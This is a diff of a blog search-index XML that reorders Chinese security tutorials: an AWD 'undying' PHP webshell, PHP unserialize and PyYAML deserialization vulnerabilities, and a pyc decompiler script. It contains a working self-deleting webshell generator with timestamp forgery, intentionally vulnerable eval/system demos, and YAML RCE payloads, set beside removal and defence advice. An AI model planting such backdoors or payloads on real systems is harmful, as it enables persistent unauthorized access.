@@ -540,15 +540,16 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Python安全小工具之反编译pyc文件]]></title>
-    <url>%2F2019%2F01%2F01%2FPython%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%2F</url>
-    <content type="text"><![CDATA[有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == ".pyc": file_path = os.path.join(parent,file) print "[*]Decompiling:", file_path cmd = "uncompyle6 " + file_path + " &gt; " + parent + "\\" + file_name + ".py" try: os.system(cmd) print "[+]Decompile successful.\n" except Exception as e: print e print "[*]Finished." else: print "[-]Wrong Directory Path."def main(): if len(sys.argv) != 2: print "[*]Usage: python decompile.py [Directory Path]" else: path = sys.argv[1] Decompile(path)if __name__ == "__main__": main() 运行效果：]]></content>
+    <title><![CDATA[PHP内存型木马]]></title>
+    <url>%2F2019%2F01%2F01%2FPHP%E5%86%85%E5%AD%98%E5%9E%8B%E6%9C%A8%E9%A9%AC%2F</url>
+    <content type="text"><![CDATA[基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d "2018-12-01 09:10:12" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \’*.php\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(".ski12.php"); exec("kill -9 $pid"); usleep(1000);&#125;?&gt;]]></content>
       <categories>
-        <category>Python</category>
+        <category>PHP</category>
       </categories>
       <tags>
-        <tag>安全开发</tag>
-        <tag>Python</tag>
+        <tag>Web安全</tag>
+        <tag>AWD</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -563,18 +564,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[PHP unserialize反序列化漏洞]]></title>
-    <url>%2F2019%2F01%2F01%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[PHP的序列化与反序列化通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。 serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。 unserialize()：将序列化后的字符串反序列化成一个对象。 简单示例： demo.php 123456789101112131415161718192021&lt;?phpclass Test&#123; public $name; public $blog;&#125;$test = new Test();$test-&gt;name = "SKI12";$test-&gt;blog = "https://blog.csdn.net/ski_12";echo "创建对象并给其属性赋值：&lt;br&gt;";foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;$str = serialize($test);echo "&lt;br&gt;对象序列化后的字符串：".$str;$f = fopen('test.txt', 'w');fwrite($f, $str);fclose($f);?&gt; 运行后，可以看到创建的对象序列化后的字符串： demo2.php 1234567891011&lt;?php$f = fopen("test.txt", "r");$str = fread($f, filesize("test.txt"));echo "读取序列化的字符串：".$str;echo "&lt;br&gt;&lt;br&gt;经过反序列化后的结果如下：&lt;br&gt;";$test = unserialize($str);foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;?&gt; 运行后，可以看到反序列化后得到对象实例：可知，创建的对象序列化后的内容为： 1O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;SKI12&quot;;s:4:&quot;blog&quot;;s:28:&quot;https://blog.csdn.net/ski_12&quot;;&#125; 简单分析一下，“O”即Object对象，“4”为对象名的长度，“Test”即对象名，“2”为对象的属性个数；进入大括号为属性的内容，“s”即string字符串类型，“4”即该属性名的长度，“name”即该属性名，接着“;”分号间隔键值或不同属性，这里为间隔键和值，后续的同理分析。 unserialize()反序列化漏洞基本概念PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的敏感操作，则会造成PHP反序列化漏洞的风险。 利用前提 unserialize()函数的参数可控； 代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类； 所写的内容需要有对象中的成员变量的值。 下面列下可能经常碰到的魔法函数，其余的查查资料也知道了。 __construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __toString()：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。 __sleep()：常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误。 __wakeup()：经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 一个简单的测试Demo： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Vuln&#123; public $name; public $blog; function __construct()&#123; echo "[*]调用__construct()&lt;br&gt;"; &#125; function __destruct()&#123; echo "[*]调用__destruct()&lt;br&gt;"; &#125; function __wakeup()&#123; echo "[*]调用__wakeup()&lt;br&gt;"; &#125; function __sleep()&#123; echo "[*]调用__sleep()&lt;br&gt;"; return array('name', 'blog'); &#125; function __toString()&#123; echo "[*]调用__toString()&lt;br&gt;"; return $this-&gt;name." : ".$this-&gt;blog."&lt;br&gt;"; &#125;&#125;echo "开始初始化对象...&lt;br&gt;";$test = new Vuln();$test-&gt;name = "SKI12";$test-&gt;blog = "https://blog.csdn.net/ski_12";echo "创建对象并给其属性赋值：&lt;br&gt;";foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;echo "开始序列化对象...&lt;br&gt;";$str = serialize($test);echo "对象序列化后的字符串：".$str."&lt;br&gt;";echo "开始反序列化对象...&lt;br&gt;";$str2 = unserialize($str);echo $str2;?&gt; 运行后可以看到各个魔法函数的调用次序： 反序列化漏洞DemoPHP代码执行示例： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; eval($this-&gt;name); &#125;&#125;$str = $_GET['ski_12'];unserialize($str);?&gt; 然后根据利用前提条件，构造序列化的字符串payload访问即可： 或者是命令执行，只需将eval()换为system()等即可： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; system($this-&gt;name); &#125;&#125;$str = $_GET['ski_12'];unserialize($str);?&gt; ###防御1、要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则； 2、要对于反序列化后的变量内容进行检查，以确定内容没有被污染。]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[Python PyYAML反序列化漏洞]]></title>
     <url>%2F2019%2F01%2F01%2FPyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[基本概念（引用百度）YAML是“YAML不是一种标记语言”的外语缩写；但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 PyYAML是Python中YAML语言的编辑器和解释器。 安装：pip install PyYAML 两个函数： yaml.dump()：将一个Python对象序列化生成为yaml文档。 yaml.load()：将一个yaml文档反序列化为一个Python对象。 简单的用例： 可以看到，User对象经过yaml序列化之后内容为一行字符串，简单解释一下：“!!pythonobject”为yaml标签，yaml.load()会识别该标签并调用相应的方法执行反序列化操作；冒号后面的“__main__”为py文件名，这里为本文件的意思；“User”为序列化的对象类型，后面紧跟的大括号即为该对象的属性及其属性值。 更详细的说明可参考官方文档。 Demo这里编写简单的Demo，一个py文件用于将恶意类序列化为字符串保存到yaml文件中，另一个py文件用于反序列化yaml文件内容为恶意类对象从而达到利用反序列化漏洞的目的。 yaml_test.py先创建一个poc对象再调用yaml.dump()将其序列化为一个字符串，其中第10行代码为将默认的“__main__”替换为该文件名“yaml_test”，目的是为了后面yaml.load()反序列化该字符串的时候会根据yaml文件中的指引去读取yaml_ test.py中的poc这个类，否则无法正确执行： yaml_test2.py直接yaml.load()读取目标yaml文件，由!!python/object标签解析其中的名为yaml_test的module中的poc类，最后执行了该类对象的__init__()方法从而执行了命令： 漏洞根源分析到$PYTHON_HOME/lib/site-packages/yaml/constructor.py中查看3个特殊Python标签的源码。 !!python/object标签： !!python/object/new标签： !!python/object/apply标签： 可以看到，!!python/object/new标签的代码实现其实就是!!python/object/apply标签的代码实现，只是最后newobj参数值不同而已。这3个Python标签中都是调用了make_python_instance()函数，查看该函数： 可以看到，在该函数是会根据参数来动态创建新的Python类对象或通过引用module的类创建对象，从而可以执行任意命令。 通用payload只要存在yaml.load()且参数可控，则可以利用yaml反序列化漏洞，payload列举如下，当然不止如下： 附上测试代码： 1234567891011import yamlpayload = '!!python/object/apply:subprocess.check_output [[calc.exe]]'#payload = '!!python/object/apply:subprocess.check_output ["calc.exe"]'#payload = '!!python/object/apply:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/apply:os.system ["calc.exe"]'#payload = '!!python/object/new:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/new:os.system ["calc.exe"]'yaml.load(payload) 一个疑问点？为什么“!!python/object”标签不好使，明明Demo用的是这个标签，但通用payload中无法执行该payload？看了一些网上的文章也没有分析原因，其实查看官方文档就知道怎么回事了： 可以看到，!!python/object标签的使用格式和另外两个根本就是两码事，其接收参数是使用大括号{}而非中括号[]，且并没有对参数args进行接收。也就是说，!!python/object标签只针对于对象类进行使用。 检测方法全局搜索Python代码中是否包含“import yaml”，若包含则进一步排查是否调用yaml.load()且参数是可控的。 防御方法使用安全函数yaml.safe_load()替代yaml.load()即可。]]></content>
@@ -583,6 +572,18 @@
       </categories>
       <tags>
         <tag>Web安全</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Python安全小工具之反编译pyc文件]]></title>
+    <url>%2F2019%2F01%2F01%2FPython%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%2F</url>
+    <content type="text"><![CDATA[有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == ".pyc": file_path = os.path.join(parent,file) print "[*]Decompiling:", file_path cmd = "uncompyle6 " + file_path + " &gt; " + parent + "\\" + file_name + ".py" try: os.system(cmd) print "[+]Decompile successful.\n" except Exception as e: print e print "[*]Finished." else: print "[-]Wrong Directory Path."def main(): if len(sys.argv) != 2: print "[*]Usage: python decompile.py [Directory Path]" else: path = sys.argv[1] Decompile(path)if __name__ == "__main__": main() 运行效果：]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>安全开发</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -658,16 +659,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[PHP内存型木马]]></title>
-    <url>%2F2019%2F01%2F01%2FPHP%E5%86%85%E5%AD%98%E5%9E%8B%E6%9C%A8%E9%A9%AC%2F</url>
-    <content type="text"><![CDATA[基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d "2018-12-01 09:10:12" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \’*.php\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(".ski12.php"); exec("kill -9 $pid"); usleep(1000);&#125;?&gt;]]></content>
+    <title><![CDATA[PHP unserialize反序列化漏洞]]></title>
+    <url>%2F2019%2F01%2F01%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[PHP的序列化与反序列化通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。 serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。 unserialize()：将序列化后的字符串反序列化成一个对象。 简单示例： demo.php 123456789101112131415161718192021&lt;?phpclass Test&#123; public $name; public $blog;&#125;$test = new Test();$test-&gt;name = "SKI12";$test-&gt;blog = "https://blog.csdn.net/ski_12";echo "创建对象并给其属性赋值：&lt;br&gt;";foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;$str = serialize($test);echo "&lt;br&gt;对象序列化后的字符串：".$str;$f = fopen('test.txt', 'w');fwrite($f, $str);fclose($f);?&gt; 运行后，可以看到创建的对象序列化后的字符串： demo2.php 1234567891011&lt;?php$f = fopen("test.txt", "r");$str = fread($f, filesize("test.txt"));echo "读取序列化的字符串：".$str;echo "&lt;br&gt;&lt;br&gt;经过反序列化后的结果如下：&lt;br&gt;";$test = unserialize($str);foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;?&gt; 运行后，可以看到反序列化后得到对象实例：可知，创建的对象序列化后的内容为： 1O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;SKI12&quot;;s:4:&quot;blog&quot;;s:28:&quot;https://blog.csdn.net/ski_12&quot;;&#125; 简单分析一下，“O”即Object对象，“4”为对象名的长度，“Test”即对象名，“2”为对象的属性个数；进入大括号为属性的内容，“s”即string字符串类型，“4”即该属性名的长度，“name”即该属性名，接着“;”分号间隔键值或不同属性，这里为间隔键和值，后续的同理分析。 unserialize()反序列化漏洞基本概念PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的敏感操作，则会造成PHP反序列化漏洞的风险。 利用前提 unserialize()函数的参数可控； 代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类； 所写的内容需要有对象中的成员变量的值。 下面列下可能经常碰到的魔法函数，其余的查查资料也知道了。 __construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __toString()：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。 __sleep()：常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误。 __wakeup()：经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 一个简单的测试Demo： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Vuln&#123; public $name; public $blog; function __construct()&#123; echo "[*]调用__construct()&lt;br&gt;"; &#125; function __destruct()&#123; echo "[*]调用__destruct()&lt;br&gt;"; &#125; function __wakeup()&#123; echo "[*]调用__wakeup()&lt;br&gt;"; &#125; function __sleep()&#123; echo "[*]调用__sleep()&lt;br&gt;"; return array('name', 'blog'); &#125; function __toString()&#123; echo "[*]调用__toString()&lt;br&gt;"; return $this-&gt;name." : ".$this-&gt;blog."&lt;br&gt;"; &#125;&#125;echo "开始初始化对象...&lt;br&gt;";$test = new Vuln();$test-&gt;name = "SKI12";$test-&gt;blog = "https://blog.csdn.net/ski_12";echo "创建对象并给其属性赋值：&lt;br&gt;";foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;echo "开始序列化对象...&lt;br&gt;";$str = serialize($test);echo "对象序列化后的字符串：".$str."&lt;br&gt;";echo "开始反序列化对象...&lt;br&gt;";$str2 = unserialize($str);echo $str2;?&gt; 运行后可以看到各个魔法函数的调用次序： 反序列化漏洞DemoPHP代码执行示例： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; eval($this-&gt;name); &#125;&#125;$str = $_GET['ski_12'];unserialize($str);?&gt; 然后根据利用前提条件，构造序列化的字符串payload访问即可： 或者是命令执行，只需将eval()换为system()等即可： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; system($this-&gt;name); &#125;&#125;$str = $_GET['ski_12'];unserialize($str);?&gt; ###防御1、要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则； 2、要对于反序列化后的变量内容进行检查，以确定内容没有被污染。]]></content>
       <categories>
         <category>PHP</category>
       </categories>
       <tags>
         <tag>Web安全</tag>
         <tag>PHP</tag>
-        <tag>AWD</tag>
       </tags>
   </entry>
 </search>
